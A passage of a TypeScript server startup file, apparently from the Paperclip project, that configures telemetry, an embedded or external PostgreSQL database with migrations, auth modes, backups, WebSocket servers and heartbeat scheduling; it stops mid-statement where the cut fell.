/// <reference path="./types/express.d.ts" />
// Kicks off the OTel bootstrap as early as possible (no-op unless
// OTEL_EXPORTER_OTLP_ENDPOINT is set). startServer() awaits
// instrumentationReady before opening DB connections or constructing the
// HTTP server, so trace coverage does not depend on incidental timing.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { instrumentationReady, shutdownInstrumentation } from "./instrumentation.js";
import { existsSync, readFileSync, rmSync } from "node:fs";
import { createServer } from "node:http";
import { resolve } from "node:path";
import { createInterface } from "node:readline/promises";
import { stdin, stdout } from "node:process";
import { pathToFileURL } from "node:url";
import type { Request as ExpressRequest, RequestHandler } from "express";
import { and, eq } from "drizzle-orm";
import {
  createDb,
  ensurePostgresDatabase,
  formatEmbeddedPostgresError,
  getPostgresDataDirectory,
  inspectMigrations,
  applyPendingMigrations,
  createEmbeddedPostgresLogBuffer,
  prepareEmbeddedPostgresNativeRuntime,
  reconcilePendingMigrationHistory,
  formatDatabaseBackupResult,
  runDatabaseBackup,
  authUsers,
  companies,
  companyMemberships,
  instanceUserRoles,
} from "@paperclipai/db";
import detectPort from "detect-port";
import { createApp } from "./app.js";
import { loadConfig } from "./config.js";
import { logger } from "./middleware/logger.js";
import { setupEnvironmentCustomImageTerminalWebSocketServer } from "./realtime/environment-custom-image-terminal-ws.js";
import { setupLiveEventsWebSocketServer } from "./realtime/live-events-ws.js";
import {
  feedbackService,
  backfillPrincipalAccessCompatibility,
  bootstrapExecutionPolicyFromEnv,
  environmentCustomImageService,
  heartbeatService,
  instanceSettingsService,
  reconcileBuiltInAgentsOnStartup,
  reconcileCloudUpstreamRunsOnStartup,
  reconcileCodexLocalManagedHomesOnStartup,
  reconcilePersistedRuntimeServicesOnStartup,
  routineService,
} from "./services/index.js";
import { resolveWorktreeRunExecutionActivationState } from "./services/instance-settings.js";
import {
  parseAdapterRegistryEnv,
  reconcileAdapterAvailability,
} from "./services/adapter-registry-bootstrap.js";
import { createFeedbackTraceShareClientFromConfig } from "./services/feedback-share-client.js";
import { buildRuntimeApiCandidateUrls, choosePrimaryRuntimeApiUrl } from "./runtime-api.js";
import { createPluginWorkerManager } from "./services/plugin-worker-manager.js";
import { createStorageServiceFromConfig } from "./storage/index.js";
import { printStartupBanner } from "./startup-banner.js";
import { getBoardClaimWarningUrl, initializeBoardClaimChallenge } from "./board-claim.js";
import { maybePersistWorktreeRuntimePorts } from "./worktree-config.js";
import { initTelemetry, getTelemetryClient } from "./telemetry.js";
import { conflict } from "./errors.js";
import type {
  InstanceDatabaseBackupRunResult,
  InstanceDatabaseBackupTrigger,
} from "./routes/instance-database-backups.js";

type BetterAuthSessionUser = {
  id: string;
  email?: string | null;
  name?: string | null;
};

type BetterAuthSessionResult = {
  session: { id: string; userId: string } | null;
  user: BetterAuthSessionUser | null;
};

type EmbeddedPostgresInstance = {
  initialise(): Promise<void>;
  start(): Promise<void>;
  stop(): Promise<void>;
};

type EmbeddedPostgresCtor = new (opts: {
  databaseDir: string;
  user: string;
  password: string;
  port: number;
  persistent: boolean;
  initdbFlags?: string[];
  onLog?: (message: unknown) => void;
  onError?: (message: unknown) => void;
}) => EmbeddedPostgresInstance;


export interface StartedServer {
  server: ReturnType<typeof createServer>;
  host: string;
  listenPort: number;
  apiUrl: string;
  databaseUrl: string;
}

export async function startServer(): Promise<StartedServer> {
  // Tracing must be active (or have failed and logged) before the first DB
  // connection or the HTTP server exists — see instrumentation.ts.
  await instrumentationReady;
  let config = loadConfig();
  initTelemetry({ enabled: config.telemetryEnabled });
  if (process.env.PAPERCLIP_SECRETS_PROVIDER === undefined) {
    process.env.PAPERCLIP_SECRETS_PROVIDER = config.secretsProvider;
  }
  if (process.env.PAPERCLIP_SECRETS_STRICT_MODE === undefined) {
    process.env.PAPERCLIP_SECRETS_STRICT_MODE = config.secretsStrictMode ? "true" : "false";
  }
  if (process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE === undefined) {
    process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE = config.secretsMasterKeyFilePath;
  }
  
  type MigrationSummary =
    | "skipped"
    | "already applied"
    | "applied (empty database)"
    | "applied (pending migrations)";
  
  function formatPendingMigrationSummary(migrations: string[]): string {
    if (migrations.length === 0) return "none";
    return migrations.length > 3
      ? `${migrations.slice(0, 3).join(", ")} (+${migrations.length - 3} more)`
      : migrations.join(", ");
  }
  
  async function promptApplyMigrations(migrations: string[]): Promise<boolean> {
    if (process.env.PAPERCLIP_MIGRATION_AUTO_APPLY === "true") return true;
    if (process.env.PAPERCLIP_MIGRATION_PROMPT === "never") return false;
    if (!stdin.isTTY || !stdout.isTTY) return true;
  
    const prompt = createInterface({ input: stdin, output: stdout });
    try {
      const answer = (await prompt.question(
        `Apply pending migrations (${formatPendingMigrationSummary(migrations)}) now? (y/N): `,
      )).trim().toLowerCase();
      return answer === "y" || answer === "yes";
    } finally {
      prompt.close();
    }
  }
  
  type EnsureMigrationsOptions = {
    autoApply?: boolean;
  };
  
  async function ensureMigrations(
    connectionString: string,
    label: string,
    opts?: EnsureMigrationsOptions,
  ): Promise<MigrationSummary> {
    const autoApply = opts?.autoApply === true;
    let state = await inspectMigrations(connectionString);
    if (state.status === "needsMigrations" && state.reason === "pending-migrations") {
      const repair = await reconcilePendingMigrationHistory(connectionString);
      if (repair.repairedMigrations.length > 0) {
        logger.warn(
          { repairedMigrations: repair.repairedMigrations },
          `${label} had drifted migration history; repaired migration journal entries from existing schema state.`,
        );
        state = await inspectMigrations(connectionString);
        if (state.status === "upToDate") return "already applied";
      }
    }
    if (state.status === "upToDate") return "already applied";
    if (state.status === "needsMigrations" && state.reason === "no-migration-journal-non-empty-db") {
      logger.warn(
        { tableCount: state.tableCount },
        `${label} has existing tables but no migration journal. Run migrations manually to sync schema.`,
      );
      const apply = autoApply ? true : await promptApplyMigrations(state.pendingMigrations);
      if (!apply) {
        throw new Error(
          `${label} has pending migrations (${formatPendingMigrationSummary(state.pendingMigrations)}). ` +
            "Refusing to start against a stale schema. Run pnpm db:migrate or set PAPERCLIP_MIGRATION_AUTO_APPLY=true.",
        );
      }
  
      logger.info({ pendingMigrations: state.pendingMigrations }, `Applying ${state.pendingMigrations.length} pending migrations for ${label}`);
      await applyPendingMigrations(connectionString);
      return "applied (pending migrations)";
    }
  
    const apply = autoApply ? true : await promptApplyMigrations(state.pendingMigrations);
    if (!apply) {
      throw new Error(
        `${label} has pending migrations (${formatPendingMigrationSummary(state.pendingMigrations)}). ` +
          "Refusing to start against a stale schema. Run pnpm db:migrate or set PAPERCLIP_MIGRATION_AUTO_APPLY=true.",
      );
    }
  
    logger.info({ pendingMigrations: state.pendingMigrations }, `Applying ${state.pendingMigrations.length} pending migrations for ${label}`);
    await applyPendingMigrations(connectionString);
    return "applied (pending migrations)";
  }
  
  function isLoopbackHost(host: string): boolean {
    const normalized = host.trim().toLowerCase();
    return normalized === "127.0.0.1" || normalized === "localhost" || normalized === "::1";
  }

  function isPostgresConnectionString(connectionString: string): boolean {
    try {
      const parsed = new URL(connectionString);
      return parsed.protocol === "postgres:" || parsed.protocol === "postgresql:";
    } catch {
      return false;
    }
  }

  function assertCloudDatabaseContract(): void {
    if (config.deploymentMode !== "authenticated" || config.deploymentExposure !== "public") {
      return;
    }
    if (!config.databaseUrl) {
      throw new Error(
        "authenticated public deployments require DATABASE_URL or config.database.connectionString; refusing embedded PostgreSQL fallback",
      );
    }
    if (!isPostgresConnectionString(config.databaseUrl)) {
      throw new Error(
        "authenticated public deployments require DATABASE_URL to be a postgres/postgresql connection string",
      );
    }
  }

  function rewriteLocalUrlPort(rawUrl: string | undefined, port: number): string | undefined {
    if (!rawUrl) return undefined;
    try {
      const parsed = new URL(rawUrl);
      // The URL API normalizes default ports like :80/:443 to "", so treat them as stable URLs.
      if (!parsed.port) return rawUrl;
      parsed.port = String(port);
      return parsed.toString();
    } catch {
      return rawUrl;
    }
  }
  
  const LOCAL_BOARD_USER_ID = "local-board";
  const LOCAL_BOARD_USER_EMAIL = "local@paperclip.local";
  const LOCAL_BOARD_USER_NAME = "Board";
  
  async function ensureLocalTrustedBoardPrincipal(db: any): Promise<void> {
    const now = new Date();
    const existingUser = await db
      .select({ id: authUsers.id })
      .from(authUsers)
      .where(eq(authUsers.id, LOCAL_BOARD_USER_ID))
      .then((rows: Array<{ id: string }>) => rows[0] ?? null);
  
    if (!existingUser) {
      await db.insert(authUsers).values({
        id: LOCAL_BOARD_USER_ID,
        name: LOCAL_BOARD_USER_NAME,
        email: LOCAL_BOARD_USER_EMAIL,
        emailVerified: true,
        image: null,
        createdAt: now,
        updatedAt: now,
      });
    }
  
    const role = await db
      .select({ id: instanceUserRoles.id })
      .from(instanceUserRoles)
      .where(and(eq(instanceUserRoles.userId, LOCAL_BOARD_USER_ID), eq(instanceUserRoles.role, "instance_admin")))
      .then((rows: Array<{ id: string }>) => rows[0] ?? null);
    if (!role) {
      await db.insert(instanceUserRoles).values({
        userId: LOCAL_BOARD_USER_ID,
        role: "instance_admin",
      });
    }
  
    const companyRows = await db.select({ id: companies.id }).from(companies);
    for (const company of companyRows) {
      const membership = await db
        .select({ id: companyMemberships.id })
        .from(companyMemberships)
        .where(
          and(
            eq(companyMemberships.companyId, company.id),
            eq(companyMemberships.principalType, "user"),
            eq(companyMemberships.principalId, LOCAL_BOARD_USER_ID),
          ),
        )
        .then((rows: Array<{ id: string }>) => rows[0] ?? null);
      if (membership) continue;
      await db.insert(companyMemberships).values({
        companyId: company.id,
        principalType: "user",
        principalId: LOCAL_BOARD_USER_ID,
        status: "active",
        membershipRole: "owner",
      });
    }
  }
  
  let db;
  let pluginMigrationDb;
  let embeddedPostgres: EmbeddedPostgresInstance | null = null;
  let embeddedPostgresStartedByThisProcess = false;
  let migrationSummary: MigrationSummary = "skipped";
  let activeDatabaseConnectionString: string;
  let resolvedEmbeddedPostgresPort: number | null = null;
  let startupDbInfo:
    | { mode: "external-postgres"; connectionString: string }
    | { mode: "embedded-postgres"; dataDir: string; port: number };
  if (config.maintenanceMode && !config.databaseUrl) {
    throw new Error(
      "Maintenance mode requires an existing external DATABASE_URL so startup cannot create or start an embedded database.",
    );
  }
  assertCloudDatabaseContract();
  if (config.databaseUrl) {
    const migrationUrl = config.databaseMigrationUrl ?? config.databaseUrl;
    migrationSummary = config.maintenanceMode
      ? "skipped"
      : await ensureMigrations(migrationUrl, "PostgreSQL");
  
    db = createDb(config.databaseUrl);
    pluginMigrationDb = config.databaseMigrationUrl ? createDb(config.databaseMigrationUrl) : db;
    logger.info("Using external PostgreSQL via DATABASE_URL/config");
    activeDatabaseConnectionString = config.databaseUrl;
    startupDbInfo = { mode: "external-postgres", connectionString: config.databaseUrl };
  } else {
    const moduleName = "embedded-postgres";
    let EmbeddedPostgres: EmbeddedPostgresCtor;
    try {
      const mod = await import(moduleName);
      EmbeddedPostgres = mod.default as EmbeddedPostgresCtor;
    } catch {
      throw new Error(
        "Embedded PostgreSQL mode requires dependency `embedded-postgres`. Reinstall dependencies (without omitting required packages), or set DATABASE_URL for external Postgres.",
      );
    }
    await prepareEmbeddedPostgresNativeRuntime();
  
    const dataDir = resolve(config.embeddedPostgresDataDir);
    const configuredPort = config.embeddedPostgresPort;
    let port = configuredPort;
    const logBuffer = createEmbeddedPostgresLogBuffer(120);
    const verboseEmbeddedPostgresLogs = process.env.PAPERCLIP_EMBEDDED_POSTGRES_VERBOSE === "true";
    const appendEmbeddedPostgresLog = (message: unknown) => {
      logBuffer.append(message);
      if (!verboseEmbeddedPostgresLogs) {
        return;
      }
      const lines = typeof message === "string"
        ? message.split(/\r?\n/)
        : message instanceof Error
          ? [message.message]
          : [String(message ?? "")];
      for (const lineRaw of lines) {
        const line = lineRaw.trim();
        if (!line) continue;
        logger.info({ embeddedPostgresLog: line }, "embedded-postgres");
      }
    };
    const logEmbeddedPostgresFailure = (phase: "initialise" | "start", err: unknown) => {
      const recentLogs = logBuffer.getRecentLogs();
      if (recentLogs.length > 0) {
        logger.error(
          {
            phase,
            recentLogs,
            err,
          },
          "Embedded PostgreSQL failed; showing buffered startup logs",
        );
      }
    };
  
    if (config.databaseMode === "postgres") {
      logger.warn("Database mode is postgres but no connection string was set; falling back to embedded PostgreSQL");
    }
  
    const clusterVersionFile = resolve(dataDir, "PG_VERSION");
    const clusterAlreadyInitialized = existsSync(clusterVersionFile);
    const postmasterPidFile = resolve(dataDir, "postmaster.pid");
    const isPidRunning = (pid: number): boolean => {
      try {
        process.kill(pid, 0);
        return true;
      } catch {
        return false;
      }
    };
  
    const getRunningPid = (): number | null => {
      if (!existsSync(postmasterPidFile)) return null;
      try {
        const pidLine = readFileSync(postmasterPidFile, "utf8").split("\n")[0]?.trim();
        const pid = Number(pidLine);
        if (!Number.isInteger(pid) || pid <= 0) return null;
        if (!isPidRunning(pid)) return null;
        return pid;
      } catch {
        return null;
      }
    };
  
    const runningPid = getRunningPid();
    if (runningPid) {
      logger.warn(`Embedded PostgreSQL already running; reusing existing process (pid=${runningPid}, port=${port})`);
    } else {
      const configuredAdminConnectionString = `postgres://paperclip:paperclip@127.0.0.1:${configuredPort}/postgres`;
      try {
        const actualDataDir = await getPostgresDataDirectory(configuredAdminConnectionString);
        if (
          typeof actualDataDir !== "string" ||
          resolve(actualDataDir) !== resolve(dataDir)
        ) {
          throw new Error("reachable postgres does not use the expected embedded data directory");
        }
        await ensurePostgresDatabase(configuredAdminConnectionString, "paperclip");
        logger.warn(
          `Embedded PostgreSQL appears to already be reachable without a pid file; reusing existing server on configured port ${configuredPort}`,
        );
      } catch {
        const detectedPort = await detectPort(configuredPort);
        if (detectedPort !== configuredPort) {
          logger.warn(`Embedded PostgreSQL port is in use; using next free port (requestedPort=${configuredPort}, selectedPort=${detectedPort})`);
        }
        port = detectedPort;
        logger.info(`Using embedded PostgreSQL because no DATABASE_URL set (dataDir=${dataDir}, port=${port})`);
        embeddedPostgres = new EmbeddedPostgres({
          databaseDir: dataDir,
          user: "paperclip",
          password: "paperclip",
          port,
          persistent: true,
          initdbFlags: ["--encoding=UTF8", "--locale=C", "--lc-messages=C"],
          onLog: appendEmbeddedPostgresLog,
          onError: appendEmbeddedPostgresLog,
        });

        if (!clusterAlreadyInitialized) {
          try {
            await embeddedPostgres.initialise();
          } catch (err) {
            logEmbeddedPostgresFailure("initialise", err);
            throw formatEmbeddedPostgresError(err, {
              fallbackMessage: `Failed to initialize embedded PostgreSQL cluster in ${dataDir} on port ${port}`,
              recentLogs: logBuffer.getRecentLogs(),
            });
          }
        } else {
          logger.info(`Embedded PostgreSQL cluster already exists (${clusterVersionFile}); skipping init`);
        }

        if (existsSync(postmasterPidFile)) {
          logger.warn("Removing stale embedded PostgreSQL lock file");
          rmSync(postmasterPidFile, { force: true });
        }
        try {
          await embeddedPostgres.start();
        } catch (err) {
          logEmbeddedPostgresFailure("start", err);
          throw formatEmbeddedPostgresError(err, {
            fallbackMessage: `Failed to start embedded PostgreSQL on port ${port}`,
            recentLogs: logBuffer.getRecentLogs(),
          });
        }
        embeddedPostgresStartedByThisProcess = true;
      }
    }
  
    const embeddedAdminConnectionString = `postgres://paperclip:paperclip@127.0.0.1:${port}/postgres`;
    const dbStatus = await ensurePostgresDatabase(embeddedAdminConnectionString, "paperclip");
    if (dbStatus === "created") {
      logger.info("Created embedded PostgreSQL database: paperclip");
    }
  
    const embeddedConnectionString = `postgres://paperclip:paperclip@127.0.0.1:${port}/paperclip`;
    const shouldAutoApplyFirstRunMigrations = !clusterAlreadyInitialized || dbStatus === "created";
    if (shouldAutoApplyFirstRunMigrations) {
      logger.info("Detected first-run embedded PostgreSQL setup; applying pending migrations automatically");
    }
    migrationSummary = config.maintenanceMode
      ? "skipped"
      : await ensureMigrations(embeddedConnectionString, "Embedded PostgreSQL", {
          autoApply: shouldAutoApplyFirstRunMigrations,
        });
  
    db = createDb(embeddedConnectionString);
    pluginMigrationDb = db;
    logger.info("Embedded PostgreSQL ready");
    activeDatabaseConnectionString = embeddedConnectionString;
    resolvedEmbeddedPostgresPort = port;
    startupDbInfo = { mode: "embedded-postgres", dataDir, port };
  }
  
  if (config.deploymentMode === "local_trusted" && !isLoopbackHost(config.host)) {
    throw new Error(
      `local_trusted mode requires loopback host binding (received: ${config.host}). ` +
        "Use authenticated mode for non-loopback deployments.",
    );
  }
  
  if (config.deploymentMode === "local_trusted" && config.deploymentExposure !== "private") {
    throw new Error("local_trusted mode only supports private exposure");
  }
  
  if (config.deploymentMode === "authenticated") {
    if (config.authBaseUrlMode === "explicit" && !config.authPublicBaseUrl) {
      throw new Error("auth.baseUrlMode=explicit requires auth.publicBaseUrl");
    }
    if (config.deploymentExposure === "public") {
      if (config.authBaseUrlMode !== "explicit") {
        throw new Error("authenticated public exposure requires auth.baseUrlMode=explicit");
      }
      if (!config.authPublicBaseUrl) {
        throw new Error("authenticated public exposure requires auth.publicBaseUrl");
      }
    }
  }

  const requestedListenPort = config.port;
  const listenPort = await detectPort(requestedListenPort);
  if (config.authBaseUrlMode === "explicit" && config.authPublicBaseUrl) {
    config.authPublicBaseUrl = rewriteLocalUrlPort(config.authPublicBaseUrl, listenPort);
  }
  
  let authReady = config.deploymentMode === "local_trusted";
  let betterAuthHandler: RequestHandler | undefined;
  let resolveSession:
    | ((req: ExpressRequest) => Promise<BetterAuthSessionResult | null>)
    | undefined;
  let resolveSessionFromHeaders:
    | ((headers: Headers) => Promise<BetterAuthSessionResult | null>)
    | undefined;
  if (!config.operatorOnlyMode && config.deploymentMode === "local_trusted") {
    await ensureLocalTrustedBoardPrincipal(db as any);
  }
  if (!config.operatorOnlyMode) {
    const accessBackfill = await backfillPrincipalAccessCompatibility(db as any);
    if (accessBackfill.agentMembershipsInserted > 0 || accessBackfill.humanGrantsInserted > 0) {
      logger.info(accessBackfill, "Backfilled principal access compatibility records");
    }
  }
  if (config.deploymentMode === "authenticated") {
    const {
      createBetterAuthHandler,
      createBetterAuthInstance,
      deriveAuthTrustedOrigins,
      resolveBetterAuthSession,
      resolveBetterAuthSessionFromHeaders,
    } = await import("./auth/better-auth.js");
    const derivedTrustedOrigins = deriveAuthTrustedOrigins(config, { listenPort });
    const envTrustedOrigins = (process.env.BETTER_AUTH_TRUSTED_ORIGINS ?? "")
      .split(",")
      .map((value) => value.trim())
      .filter((value) => value.length > 0);
    const effectiveTrustedOrigins = Array.from(new Set([...derivedTrustedOrigins, ...envTrustedOrigins]));
    logger.info(
      {
        authBaseUrlMode: config.authBaseUrlMode,
        authPublicBaseUrl: config.authPublicBaseUrl ?? null,
        trustedOrigins: effectiveTrustedOrigins,
        trustedOriginsSource: {
          derived: derivedTrustedOrigins.length,
          env: envTrustedOrigins.length,
        },
      },
      "Authenticated mode auth origin configuration",
    );
    const auth = createBetterAuthInstance(db as any, config, effectiveTrustedOrigins);
    betterAuthHandler = createBetterAuthHandler(auth);
    resolveSession = (req) => resolveBetterAuthSession(auth, req);
    resolveSessionFromHeaders = (headers) => resolveBetterAuthSessionFromHeaders(auth, headers);
    if (!config.operatorOnlyMode) {
      await initializeBoardClaimChallenge(db as any, { deploymentMode: config.deploymentMode });
    }
    authReady = true;
  }

  if (resolvedEmbeddedPostgresPort !== null && resolvedEmbeddedPostgresPort !== config.embeddedPostgresPort) {
    config.embeddedPostgresPort = resolvedEmbeddedPostgresPort;
  }
  if (!config.operatorOnlyMode) {
    maybePersistWorktreeRuntimePorts({
      serverPort: listenPort,
      databasePort: resolvedEmbeddedPostgresPort,
    });
  }
  const uiMode = config.uiDevMiddleware ? "vite-dev" : config.serveUi ? "static" : "none";
  const storageService = createStorageServiceFromConfig(config);
  const feedback = feedbackService(db as any, {
    shareClient: createFeedbackTraceShareClientFromConfig(config),
  });
  const backupSettingsSvc = instanceSettingsService(db);
  const databaseBackupMaxAgeHours = Math.max(
    1,
    Number(process.env.PAPERCLIP_DB_BACKUP_MAX_AGE_HOURS) ||
      Math.max(26, Math.ceil((config.databaseBackupIntervalMinutes / 60) * 2)),
  );
  const databaseBackupAlertFile =
    process.env.PAPERCLIP_DB_BACKUP_ALERT_FILE ||
    resolve(config.databaseBackupDir, "..", "health", "db-backup-to-s3.failure");
  const databaseBackupAlertFiles = [
    databaseBackupAlertFile,
    resolve(config.databaseBackupDir, "db-backup-to-s3.failure"),
    resolve(config.databaseBackupDir, "..", "db-backup-to-s3.failure"),
  ];
  let databaseBackupInFlight = false;
  const runServerDatabaseBackup = async (
    trigger: InstanceDatabaseBackupTrigger,
  ): Promise<InstanceDatabaseBackupRunResult | null> => {
    if (databaseBackupInFlight) {
      const message = "Database backup already in progress";
      if (trigger === "scheduled") {
        logger.warn("Skipping scheduled database backup because a previous backup is still running");
        return null;
      }
      throw conflict(message);
    }

    databaseBackupInFlight = true;
    const startedAt = new Date();
    const startedAtMs = Date.now();
    const label = trigger === "scheduled" ? "Automatic" : "Manual";
    try {
      logger.info({ backupDir: config.databaseBackupDir, trigger }, `${label} database backup starting`);
      // Read retention from Instance Settings (DB) so changes take effect without restart.
      const generalSettings = await backupSettingsSvc.getGeneral();
      const retention = generalSettings.backupRetention;

      const result = await runDatabaseBackup({
        connectionString: activeDatabaseConnectionString,
        backupDir: config.databaseBackupDir,
        retention,
        filenamePrefix: "paperclip",
      });
      const finishedAt = new Date();
      const response: InstanceDatabaseBackupRunResult = {
        ...result,
        trigger,
        backupDir: config.databaseBackupDir,
        retention,
        startedAt: startedAt.toISOString(),
        finishedAt: finishedAt.toISOString(),
        durationMs: Date.now() - startedAtMs,
      };
      logger.info(
        {
          backupFile: result.backupFile,
          sizeBytes: result.sizeBytes,
          prunedCount: result.prunedCount,
          backupDir: config.databaseBackupDir,
          retention,
          trigger,
          durationMs: response.durationMs,
        },
        `${label} database backup complete: ${formatDatabaseBackupResult(result)}`,
      );
      return response;
    } catch (err) {
      logger.error({ err, backupDir: config.databaseBackupDir, trigger }, `${label} database backup failed`);
      throw err;
    } finally {
      databaseBackupInFlight = false;
    }
  };
  const pluginWorkerManager = createPluginWorkerManager();
  const app = await createApp(db as any, {
    uiMode,
    serverPort: listenPort,
    storageService,
    feedbackExportService: feedback,
    databaseBackupService: {
      runManualBackup: async () => {
        const result = await runServerDatabaseBackup("manual");
        if (!result) {
          throw conflict("Database backup already in progress");
        }
        return result;
      },
    },
    databaseBackupHealth: config.databaseBackupEnabled
      ? {
          enabled: config.databaseBackupEnabled,
          backupDir: config.databaseBackupDir,
          maxAgeHours: databaseBackupMaxAgeHours,
          alertFile: databaseBackupAlertFile,
          alertFiles: databaseBackupAlertFiles,
        }
      : undefined,
    deploymentMode: config.deploymentMode,
    deploymentExposure: config.deploymentExposure,
    allowedHostnames: config.allowedHostnames,
    bindHost: config.host,
    authReady,
    companyDeletionEnabled: config.companyDeletionEnabled,
    pluginMigrationDb: pluginMigrationDb as any,
    betterAuthHandler,
    resolveSession,
    pluginWorkerManager,
    operatorOnlyMode: config.operatorOnlyMode,
  });
  const server = createServer(app as unknown as Parameters<typeof createServer>[0]);

  // Increase keep-alive timeouts to safely outlive default idle timeouts
  // of common reverse proxies and load balancers (like AWS ALB, Nginx, or Traefik).
  // This prevents intermittent 502/ECONNRESET errors caused by Node's 5s default.
  server.keepAliveTimeout = 185000;
  server.headersTimeout = 186000;
  
  if (listenPort !== requestedListenPort) {
    logger.warn(`Requested port is busy; using next free port (requestedPort=${requestedListenPort}, selectedPort=${listenPort})`);
  }
  
  const runtimeListenHost = config.host;
  const runtimeApiUrl = choosePrimaryRuntimeApiUrl({
    authPublicBaseUrl: config.authPublicBaseUrl ?? null,
    allowedHostnames: config.allowedHostnames,
    bindHost: runtimeListenHost,
    port: listenPort,
  });
  const configuredApiUrl = config.maintenanceMode
    ? runtimeApiUrl
    : process.env.PAPERCLIP_API_URL?.trim() || runtimeApiUrl;
  const runtimeApiCandidates = buildRuntimeApiCandidateUrls({
    preferredApiUrl: configuredApiUrl,
    authPublicBaseUrl: config.authPublicBaseUrl ?? null,
    allowedHostnames: config.allowedHostnames,
    bindHost: runtimeListenHost,
    port: listenPort,
  });
  process.env.PAPERCLIP_LISTEN_HOST = runtimeListenHost;
  process.env.PAPERCLIP_LISTEN_PORT = String(listenPort);
  process.env.PAPERCLIP_RUNTIME_API_URL = runtimeApiUrl;
  process.env.PAPERCLIP_RUNTIME_API_CANDIDATES_JSON = JSON.stringify(runtimeApiCandidates);
  process.env.PAPERCLIP_API_URL = configuredApiUrl;
  
  setupEnvironmentCustomImageTerminalWebSocketServer(server, db as any, {
    pluginWorkerManager,
  });
  setupLiveEventsWebSocketServer(server, db as any, {
    deploymentMode: config.deploymentMode,
    resolveSessionFromHeaders,
  });

  if (!config.operatorOnlyMode) {
    void reconcilePersistedRuntimeServicesOnStartup(db as any)
      .then((result) => {
        if (result.reconciled > 0) {
          logger.warn(
            { reconciled: result.reconciled },
            "reconciled persisted runtime services from a previous server process",
          );
        }
      })
      .catch((err) => {
        logger.error({ err }, "startup reconciliation of persisted runtime services failed");
      });

    void reconcileCloudUpstreamRunsOnStartup(db as any)
      .then((result) => {
        if (result.reconciled > 0) {
          logger.warn(
            { reconciled: result.reconciled },
            "reconciled cloud upstream runs from a previous server process",
          );
        }
      })
      .catch((err) => {
        logger.error({ err }, "startup reconciliation of cloud upstream runs failed");
      });

    // Backfill auth.json into any already-isolated codex_local managed home that
    // was created by the #8272 isolation guard before the Phase 1 seeding fix.
    // Idempotent; the Phase 1 execute-time seeding covers new strandings.
    void reconcileCodexLocalManagedHomesOnStartup(db)
      .then((result) => {
        if (result.seeded > 0 || result.failed > 0) {
          logger.warn(
            { seeded: result.seeded, failed: result.failed, scanned: result.scanned },
            "reconciled codex_local managed homes (backfilled missing auth)",
          );
        }
        if (result.sourceAuthMissing > 0) {
          logger.warn(
            { sourceAuthMissing: result.sourceAuthMissing, scanned: result.scanned },
            "could not backfill codex_local managed homes because shared Codex auth is missing",
          );
        }
      })
      .catch((err) => {
        logger.error({ err }, "startup reconciliation of codex_local managed homes failed");
      });

    void reconcileBuiltInAgentsOnStartup(db as any)
      .then((result) => {
        if (result.reconciled > 0 || result.unknown > 0 || result.duplicates > 0 || result.autoEnsured > 0) {
          logger.warn(
            result,
            "startup reconciliation of built-in agents complete",
          );
        }
      })
      .catch((err) => {
        logger.error({ err }, "startup reconciliation of built-in agents failed");
      });

    // Force the instance onto the Kubernetes sandbox provider when configured via
    // env (PAPERCLIP_EXECUTION_MODE=kubernetes). Runs BEFORE the heartbeat resumes
    // queued runs so the policy + managed k8s environments are in place. A bad
    // PAPERCLIP_EXECUTION_MODE / PAPERCLIP_K8S_* value throws and fails startup
    // (fail-loud) rather than silently allowing local execution.
    try {
      const policyResult = await bootstrapExecutionPolicyFromEnv(db as any);
      if (policyResult) {
        logger.warn(
          {
            executionMode: policyResult.executionMode,
            companiesConfigured: policyResult.companiesConfigured,
          },
          "forced execution policy applied at startup",
        );
      }
    } catch (err) {
      logger.error({ err }, "failed to apply forced execution policy from environment");
      throw err;
    }
  }

  let drainHeartbeatRunsForShutdown: ((signal: "SIGINT" | "SIGTERM") => Promise<unknown>) | null = null;
  let heartbeatSchedulerStopped = false;
  let heartbeatSchedulerInterval: ReturnType<typeof setInterval> | null = null;
  let executionRecoveryDriverInterval: ReturnType<typeof setInterval> | null = null;
  const heartbeatSchedulerInFlight = new Set<Promise<void>>();
  const trackHeartbeatSchedulerWork = (work: Promise<unknown>) => {
    let tracked: Promise<void>;
    tracked = Promise.resolve(work)
      .then(() => undefined, () => undefined)
      .finally(() => {
        heartbeatSchedulerInFlight.delete(tracked);
      });
    heartbeatSchedulerInFlight.add(tracked);
  };
  const waitForHeartbeatSchedulerIdle = async () => {
    while (heartbeatSchedulerInFlight.size > 0) {
      await Promise.allSettled([...heartbeatSchedulerInFlight]);
    }
  };

  if (config.heartbeatSchedulerEnabled) {
    const heartbeat = heartbeatService(db as any, { pluginWorkerManager });
    drainHeartbeatRunsForShutdown = heartbeat.drainRunningRunsForShutdown;
    const environmentCustomImages = environmentCustomImageService(db as any, { pluginWorkerManager });
    const routines = routineService(db as any, { pluginWorkerManager });
    const worktreeRunExecutionActivation = await resolveWorktreeRunExecutionActivationState({
      getExperimental: () => instanceSettingsService(db).getExperimental(),
    });
    logger.info(
      {
        state: worktreeRunExecutionActivation.armed ? "armed" : "disarmed",
        cutoff: worktreeRunExecutionActivation.cutoff,
      },
      "worktree run-execution cutoff state",
    );
    const heartbeatSchedulingSuppression = await heartbeat.resolveSchedulingSuppression();

    // Reap orphaned runs before timer ticks start so wakeups cannot coalesce
    // into a dead "running" row during startup recovery.
    if (heartbeatSchedulingSuppression.suppressed) {
      logger.warn(
        { reason: heartbeatSchedulingSuppression.reason },
        "heartbeat scheduling suppressed for this runtime instance",
      );
    } else {
      const startupHeartbeatRecovery = (async () => {
        for (let attempt = 1; attempt <= 2; attempt++) {
          try {
            const result = await heartbeat.reapOrphanedRuns();
            logger.info(
              { reaped: result.reaped, runIds: result.runIds },
              "startup reap of orphaned heartbeat runs complete",
            );
            break;
          } catch (err) {
            if (attempt < 2) {
              logger.warn({ err, attempt }, "startup reap failed, retrying");
            } else {
              logger.error(
                { err },
                "startup reap of orphaned heartbeat runs failed after retry — periodic reaper will serve as degraded backstop",
              );
            }
          }
        }

        const promotion = await heartbeat.promoteDueScheduledRetries();
        await heartbeat.resumeQueuedRuns();
        const reconciled = await heartbeat.reconcileStrandedAssignedIssues();
        if (
          promotion.promoted > 0 ||
          reconciled.assignmentDispatched > 0 ||
          reconciled.dispatchRequeued > 0 ||
          reconciled.continuationRequeued > 0 ||
          reconciled.successfulRunHandoffEscalated > 0 ||
          reconciled.escalated > 0
        ) {
          logger.warn(
            { promotedScheduledRetries: promotion.promoted, promotedScheduledRetryRunIds: promotion.runIds, ...reconciled },
